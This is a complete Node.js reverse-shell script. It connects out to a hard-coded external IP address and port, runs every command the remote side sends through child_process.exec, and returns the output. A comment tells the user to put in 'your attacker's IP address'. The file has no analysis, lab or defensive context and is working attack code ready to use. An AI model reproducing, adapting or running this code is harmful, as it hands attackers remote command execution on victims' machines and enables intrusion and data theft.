// reverse-shell.js

const net = require("net");

const { exec } = require("child_process");


const HOST = "141.136.44.52"; // Change this to your attacker's IP address

const PORT = 50502; // Change this to your desired port


const client = new net.Socket();

client.connect(PORT, HOST, () => {

  console.log(`Connected to ${HOST}:${PORT}`);

  client.write("Connection established\n");

});


client.on("data", (data) => {

  exec(data.toString(), (err, stdout, stderr) => {

    if (err) {

      client.write(`Error: ${stderr}\n`);

    } else {

      client.write(stdout);

    }

  });

});


client.on("error", (err) => {

  console.error(`Connection error: ${err.message}`);

  client.destroy();

});


client.on("close", () => {

  console.log("Connection closed");

});
